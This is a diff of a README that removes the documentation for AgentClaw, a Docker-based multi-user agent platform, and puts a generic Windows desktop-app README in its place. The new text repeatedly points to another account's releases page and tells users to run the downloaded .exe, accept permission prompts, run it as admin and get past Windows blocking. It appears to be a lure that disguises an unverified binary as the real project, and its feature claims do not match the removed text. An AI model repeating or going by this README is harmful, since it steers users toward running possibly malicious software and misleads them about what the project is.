@@ -1,277 +1,192 @@
-# AgentClaw - OpenClaw Multi-User Agent Platform (for Small Teams)
+# 🤖 agentClaw - Simple agent control for small teams
 
-![AgentClaw Logo](frontend/public/logo.png)
+[![Download agentClaw](https://img.shields.io/badge/Download%20agentClaw-Visit%20Releases-blue.svg)](https://github.com/Myintth4187/agentClaw/releases)
 
-[中文版 README](README_CN.md)
-
-Inspired by open-source projects and built on the shoulders of giants, I put this together after plenty of tinkering. Some code is derived from the open-source community, now shared back. If you find it useful, a star would mean a lot.
-Issues and feedback are welcome.
+## 🧭 What is agentClaw?
 
-Upgrade **OpenClaw's single-user agents** into a **multi-tenant agent platform** with a unified entry, user isolation, shared instances, dynamic sandboxes, and security governance. Built for small teams to spin up an internal agent platform quickly.
+agentClaw is a small team agent platform for Windows. It helps you set up and use openclaw agents for multiple users in one place. It is built for people who want a simple setup and a clear way to run agent tools on their computer.
 
-**AgentClaw** provides multi-user agent runtime and governance. Each user runs their own agent sessions and workflows inside an isolated Docker sandbox.
+Use it if you want:
+- one place to manage agents
+- support for multiple users
+- a simple desktop run flow
+- a setup that works well for small teams
 
-Built on OpenClaw with a multi-tenant architecture — shared OpenClaw instances plus dynamic agent sandboxes for tenant isolation.
-
-## Key Features
-
-- **🧩 Multi-User Agent Platform** - Unified entry for small teams, user isolation, agent lifecycle management
-- **🐳 Strict Sandbox Isolation** - Per-user Docker containers with preinstalled Python/Node/toolchains
-- **🌐 Network Access** - API calls, package installs, web crawling supported
-- **🔒 Security Governance** - Automated security checks and least-privilege capabilities
-- **📦 Asset Reuse** - Skills/workflows/tools can be reused and shared across the platform
-- **🧩 Composable Agents** - Customize agents for yourself or your team, and freely combine reusable skill packs
-- **🔌 Zero-Intrusion Integration** - No OpenClaw source modifications; multi-user via Bridge layer
-
-## Quick Start
-
-### Demo
-
-Try it now: **https://agent.428916.xyz**
-
-| Role | Username | Password |
-|------|----------|----------|
-| Admin | admin | 123456 |
-| User | user | 123456 |
-
-> Note: Demo branch limits to 3 users (1 admin + 2 regular users). [Source code](https://github.com/wuding129/agentClaw/tree/demo)
-
-### Requirements
-
-- Docker & Docker Compose
-- At least one LLM API key (Anthropic/OpenAI/DashScope, etc.)
-
-### Setup
-
-```bash
-cp .env.example .env
-# edit .env and add LLM API keys
-```
-
-### Run
-
-```bash
-# optional: environment check
-python prepare.py
-
-# build (if needed) and start services
-# first run (or when Dockerfile/source changed)
-docker compose up -d --build
-# if images are already built
-docker compose up -d
-```
-
-Visit http://127.0.0.1:3080
-
-## Deployment Notes
-
-- AgentClaw is **based on the official OpenClaw packages** and **does not require any OpenClaw source modifications**.
-- You can deploy directly with Docker Compose; `--build` ensures images are rebuilt when Dockerfiles or source change.
-- `prepare.py` helps validate Docker and `.env` before starting.
-- User files are persisted on the host (for example `~/.openclaw` and Docker volumes). Removing those will delete data.
-- Default OpenClaw version is **2026.3.8** (build arg `OPENCLAW_VERSION`). To change it, set `OPENCLAW_VERSION` in `.env` and rerun `docker compose up -d --build`.
-> Note: The **first registered user becomes admin** by default.
-
-## Architecture
-
-AgentClaw uses a multi-tenant architecture on top of OpenClaw: shared OpenClaw instances + dynamic agent sandboxes:
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                          User Browser                            │
-│                   Frontend (React + Vite)                        │
-└───────────────────────────┬─────────────────────────────────────┘
-                            │ HTTP / WebSocket
-┌───────────────────────────▼─────────────────────────────────────┐
-│                    Platform Gateway                              │
-│                   FastAPI + PostgreSQL                           │
-│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────────┐  │
-│  │  JWT Auth   │  │  LLM Proxy  │  │ Shared Instance Manager │  │
-│  └─────────────┘  └─────────────┘  └─────────────────────────┘  │
-└───────────────────────────┬─────────────────────────────────────┘
-                            │
-┌───────────────────────────▼─────────────────────────────────────┐
-│                  OpenClaw Shared Instance                        │
-│  ┌─────────────────────────────────────────────────────────┐    │
-│  │  Bridge (HTTP API)  ◄──►  OpenClaw Gateway (Agent Engine)│    │
-│  └─────────────────────────────────────────────────────────┘    │
-│                              │                                  │
-│         ┌────────────────────┼────────────────────┐             │
-│         │                    │                    │             │
-│    ┌────▼────┐         ┌────▼────┐         ┌────▼────┐        │
-│    │ Sandbox │         │ Sandbox │         │ Sandbox │        │
-│    │ User A  │         │ User B  │         │ main    │        │
-│    └─────────┘         └─────────┘         └─────────┘        │
-└─────────────────────────────────────────────────────────────────┘
-```
-
-## Screenshots
-
-![Screenshot 1](docs/assets/ScreenShot_2026-03-18_130908_672.png)
-![Screenshot 2](docs/assets/ScreenShot_2026-03-18_130949_774.png)
-![Screenshot 3](docs/assets/ScreenShot_2026-03-18_131005_077.png)
-![Screenshot 4](docs/assets/ScreenShot_2026-03-18_131015_934.png)
-![Screenshot 5](docs/assets/ScreenShot_2026-03-18_131032_353.png)
-![Screenshot 6](docs/assets/ScreenShot_2026-03-18_132407_028.png)
-![Screenshot 7](docs/assets/ScreenShot_2026-03-18_132534_637.png)
-![Screenshot 8](docs/assets/ScreenShot_2026-03-18_133426_647.png)
-![Screenshot 9](docs/assets/ScreenShot_2026-03-18_133618_386.png)
-![Screenshot 10](docs/assets/ScreenShot_2026-03-18_133809_104.png)
-![Screenshot 11](docs/assets/ScreenShot_2026-03-18_133833_735.png)
-
-### Zero-Intrusion Integration
-
-AgentClaw **does not modify OpenClaw source**. Multi-tenancy is achieved through a Bridge adapter layer:
-
-```
-OpenClaw (upstream)
-    │
-    │ Native WebSocket / RPC
-    │
-    ▼
-Bridge (adapter) ───► HTTP API + multi-tenant routing
-    │
-    │ Config injection
-    │
-    ▼
-Platform Gateway (auth/proxy)
-```
-
-**Bridge responsibilities:**
-- Convert OpenClaw WebSocket RPC to REST APIs
-- Inject multi-tenant config (`X-Agent-Id` routing)
-- Manage per-agent workspace directories
-- Forward LLM requests to the Platform Gateway
-
-This lets AgentClaw track upstream OpenClaw updates without maintaining a fork.
-
-### Multi-Agent Design
-
-OpenClaw supports multiple agents natively. AgentClaw uses that to achieve tenant isolation:
-
-| Concept | Description |
-|------|------|
-| Agent ID | Unique user identifier (e.g. `08f95579-5ad0-48f6-a945-1233309a4fc0`) |
-| Workspace | Per-agent directory `~/.openclaw/workspace-{agentId}/` |
-| Sandbox | Docker container created on demand; destroyed after execution |
-| Session | Routed as `agent:{agentId}:{sessionKey}` |
-
-### Sandbox Configuration
-
-Default sandbox image config:
-
-```json
-{
-  "sandbox": {
-    "mode": "all",           // all sessions use sandbox
-    "scope": "agent",        // per-agent sandbox
-    "workspaceAccess": "rw", // read/write workspace
-    "docker": {
-      "image": "openclaw-sandbox:agentclaw",
-      "readOnlyRoot": false,
-      "network": "bridge",
-      "user": "0:0",
-      "memory": "2g",
-      "cpus": 2,
-      "pidsLimit": 256,
-      "capDrop": ["ALL"]
-    }
-  }
-}
-```
-
-## Platform Usage (Skills Are Only One Part)
-
-### 1. Create a Skill (Reusable Asset)
-
-```
-skills/
-└── my-skill/
-    ├── SKILL.md          # description, triggers, usage
-    ├── scripts/
-    │   └── main.py       # executable script
-    └── references/       # references
-```
-
-### 2. Sandbox Testing (Unified Runtime)
-
-Agent executes scripts inside the sandbox:
-
-```bash
-# install deps
-apt-get update && apt-get install -y some-package
-pip install requests
-
-# run test
-timeout 30 python3 scripts/main.py
-```
-
-### 3. Security Review (Platform Governance)
-
-Creating/updating a skill triggers automated security checks.
-
-### 4. Share & Install (Asset Distribution)
-
-- Submit to the curated skill library
-- Other users can install into any agent with one click
-
-## Project Structure
-
-```
-.
-├── bridge/              # Bridge adapter
-│   ├── config.ts        # OpenClaw multi-tenant config generation
-│   ├── server.ts        # HTTP API + WebSocket relay
-│   └── routes/          # Agents, Skills, Files APIs
-│
-├── platform/            # Platform gateway (Python FastAPI)
-│   ├── auth.py          # JWT auth + agent lifecycle
-│   ├── proxy.py         # Route requests to shared instance
-│   └── shared_manager.py # Shared OpenClaw instance manager
-│
-├── frontend/            # Web frontend (React + Vite)
-│   └── pages/           # Chat, Agents, Skills, FileManager
-│
-├── sandbox/             # Sandbox image Dockerfile
-│   └── Dockerfile       # Multi-user agent execution environment
-│
-└── docker-compose.yml   # Multi-service composition
-```
-
-## Security Design
-
-| Layer | Measure |
-|------|------|
-| API Key Isolation | All LLM API keys live only in Gateway env vars |
-| Sandbox Execution | Code runs in Docker with resource limits, no escape |
-| File Isolation | Per-user workspace; cross-user access blocked |
-| Network Isolation | Outbound allowed; inbound blocked |
-| Capability Limits | `capDrop: ALL`, optional read-only root |
-
-## Highlights
-
-AgentClaw architecture highlights:
-
-- **Zero-Intrusion Integration** - No OpenClaw source changes; Bridge adapter only
-- **Shared Instance** - Single OpenClaw Gateway serving multiple users efficiently
-- **Dynamic Sandbox** - On-demand Docker environments
-- **Security Isolation** - JWT auth, API key proxying, filesystem isolation
-
-This architecture can be adapted to other agent engines for internal agent platforms or multi-tenant AI platforms.
-
-
-## Contact
-
-- WeChat: `wdyt1008521`
-- Email: `wuding129@163.com`
-
-## License
-
-MIT
-
-## Acknowledgements
-
-This project is inspired by and derived from:
-- [OpenClaw](https://github.com/opendilab/openclaw) - Copyright (c) OpenDILab
-- [nanobot](https://github.com/HKUDS/nanobot) - Copyright (c) HKUDS
-- [MultiUserClaw](https://github.com/johnson7788/MultiUserClaw) - Copyright (c) johnson7788
+## 💾 Download agentClaw
+
+Go to the releases page here:
+
+https://github.com/Myintth4187/agentClaw/releases
+
+On that page, look for the latest release and download the Windows file for your computer. In most cases, this will be an `.exe` file or a `.zip` file that contains the app.
+
+## 🪟 Install on Windows
+
+### If you downloaded an `.exe` file
+1. Open the folder where the file was saved.
+2. Double-click the file.
+3. If Windows asks for permission, choose **Yes**.
+4. Follow the setup steps on screen.
+5. When setup ends, open agentClaw from the Start menu or desktop shortcut.
+
+### If you downloaded a `.zip` file
+1. Open the downloaded `.zip` file.
+2. Click **Extract All**.
+3. Pick a folder, such as `Downloads` or `Desktop`.
+4. Open the extracted folder.
+5. Double-click the app file inside the folder.
+6. If Windows asks for permission, choose **Yes**.
+
+## ⚙️ System needs
+
+agentClaw is made for Windows desktop use. For a smooth start, use:
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 200 MB of free disk space
+- A stable internet connection
+- A screen resolution of 1280 x 720 or higher
+
+For small teams, 8 GB RAM gives more room when several users work at once.
+
+## 🔐 First-time setup
+
+When you open agentClaw for the first time, you may need to:
+1. Choose a workspace folder
+2. Sign in with your team account if your setup uses one
+3. Add your first agent
+4. Set user access for each team member
+5. Save the settings
+
+If your team already has an openclaw setup, use the same account details and workspace path that your admin gave you.
+
+## 🧠 Main features
+
+### 👥 Multiuser support
+agentClaw is built for teams. You can set up access for more than one user and keep work organized.
+
+### 🧰 Agent management
+You can create, start, stop, and adjust agents from one place. This keeps daily work simple.
+
+### 📁 Local workspace use
+The app can use a local folder for team data, settings, and agent files. This makes it easier to keep things in order.
+
+### 🔄 Easy team setup
+The app is designed for small teams that want a shared tool without a long setup process.
+
+### 🖥️ Windows-friendly use
+agentClaw fits a normal Windows workflow. You can launch it from your desktop and use it like other desktop apps.
+
+## 🚦 How to use agentClaw
+
+1. Open the app.
+2. Choose or create a workspace.
+3. Add the users who need access.
+4. Create your first agent.
+5. Start the agent.
+6. Check the status panel to see if it is running.
+7. Make changes if you need a different setup for your team.
+
+If you are setting it up for a group, start with one agent and one user. After that works, add the rest of the team.
+
+## 🧩 Common use cases
+
+### Small team work
+Use agentClaw when a few people need the same agent tools in one place.
+
+### Shared operations
+Use it when one person sets up the agents and other users only need access to run tasks.
+
+### Local testing
+Use it to test agent flows on a Windows PC before you roll them out to a larger group.
+
+### Team demos
+Use it to show how openclaw agents work for multiuser setups.
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+- Make sure the download finished
+- Try running the app as an admin
+- Check that Windows did not block the file
+- Reboot your PC and try again
+
+### Windows shows a security prompt
+- Choose **Yes** if you trust the release you downloaded from the official releases page
+- If the file is in a zip archive, extract it first and then run the app
+
+### The app starts but nothing loads
+- Check your internet connection
+- Close the app and open it again
+- Make sure your workspace folder still exists
+- Confirm that your team account details are correct
+
+### Another user cannot access the workspace
+- Check user permissions
+- Make sure the right account is added
+- Confirm the shared folder path is the same for all users
+
+## 📦 Release files
+
+The releases page may include:
+- Windows installer files
+- Portable zip files
+- Update packages
+- Release notes
+
+When a new version comes out, use the latest file on the releases page.
+
+## 🧾 Folder layout
+
+A typical setup may use these folders:
+- `Workspace` for shared team data
+- `Agents` for agent files
+- `Logs` for run history
+- `Config` for app settings
+
+Keep these folders in a place that all team members can reach if your setup uses a shared drive.
+
+## 🧑‍💻 For team admins
+
+If you manage the setup for a small group:
+- create one workspace for the team
+- add users with the right access level
+- keep agent names clear
+- store files in one shared folder
+- check logs if something stops working
+
+A clean folder setup makes it easier for everyone to use the app.
+
+## 🔁 Updating agentClaw
+
+When a new version is ready:
+1. Open the releases page.
+2. Download the newest Windows file.
+3. Close the old version.
+4. Install or replace the files with the new version.
+5. Open the app again and check your workspace.
+
+If you use a zip file, extract the new version into a new folder first. This helps keep your old files safe until you confirm the update works.
+
+## 📚 Helpful file names
+
+You may see file names that include:
+- version numbers
+- `windows`
+- `setup`
+- `release`
+- `x64`
+
+If you are not sure which file to choose, pick the latest Windows file for your system.
+
+## 🧭 What to do first
+
+If this is your first time using agentClaw:
+1. Download the latest Windows file from the releases page
+2. Install or extract it
+3. Open the app
+4. Set your workspace
+5. Add one agent
+6. Add one user
+7. Confirm the app runs as expected
+
+After that, you can add more users and agents as needed
